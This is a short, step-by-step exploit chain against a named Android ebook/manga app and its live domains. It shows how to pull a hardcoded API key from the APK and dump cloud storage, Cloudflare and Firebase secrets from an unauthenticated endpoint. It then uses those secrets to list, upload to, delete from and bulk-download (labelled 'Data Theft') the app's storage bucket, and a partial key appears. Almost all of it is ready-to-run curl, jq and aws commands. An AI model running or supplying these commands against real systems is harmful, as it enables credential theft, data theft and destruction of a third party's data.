##  Step 1 – Extract the Hardcoded API Key

The API key is embedded in the APK’s classes.dex. It can be extracted by grepping the decompiled code:

grep -r "cda11g3Q" decompiled_res/smali/

Key:
cda11g3QCl[REDACTED]

---

##  Step 2 – Dump All Credentials from /settings

The endpoint /api.php?settings is unauthenticated – it requires only the API key (which is public).

API_KEY="cda11g3QCl[REDACTED]"

curl -s -H 'Data-Agent: Android Ebook App' \
  "https://mangaindo.sobatfile.my.id/api/v1/api.php?settings&api_key=$API_KEY" \
  | jq '.setting' > settings_dump.json

Extract critical credentials:
R2_ACCOUNT=$(jq -r '.r2_account_id' settings_dump.json)
R2_ACCESS=$(jq -r '.r2_access_key_id' settings_dump.json)
R2_SECRET=$(jq -r '.r2_secret_access_key [REDACTED])
BUCKET=$(jq -r '.r2_bucket_name' settings_dump.json)
CF_TOKEN=$(jq -r '.cf_api_token [REDACTED])
CF_ZONE=$(jq -r '.cf_zone_id' settings_dump.json)
FIREBASE_KEY=$(jq -r '.firebase_web_api_key [REDACTED])

---

##  Step 3 – R2 Bucket Takeover (Read, Write, Delete)

### 3.1 List All Objects
curl -s --aws-sigv4 "aws:amz:auto:s3" --user "$R2_ACCESS:$R2_SECRET" \
  "https://$R2_ACCOUNT.r2.cloudflarestorage.com/$BUCKET?list-type=2&max-keys=1000" \
  | xmllint --format -

### 3.2 Upload a Test File
echo "security test – poc" > /tmp/poc.txt
curl -s -X PUT --aws-sigv4 "aws:amz:auto:s3" --user "$R2_ACCESS:$R2_SECRET" \
  --upload-file /tmp/poc.txt \
  "https://$R2_ACCOUNT.r2.cloudflarestorage.com/$BUCKET/poc.txt"

Verify public access:
curl -s "https://cdn.zonakomik.web.id/poc.txt"

### 3.3 Delete a File
curl -s -X DELETE --aws-sigv4 "aws:amz:auto:s3" --user "$R2_ACCESS:$R2_SECRET" \
  "https://$R2_ACCOUNT.r2.cloudflarestorage.com/$BUCKET/poc.txt"

### 3.4 Bulk Download (Data Theft)
aws configure set aws_access_key_id $R2_ACCESS
aws configure set aws_secret_access_key $R2_SECRET
aws configure set default.region auto
aws s3 --endpoint-url "https://$R2_ACCOUNT.r2.cloudflarestorage.com" sync s3://$BUCKET ./manga_backup/

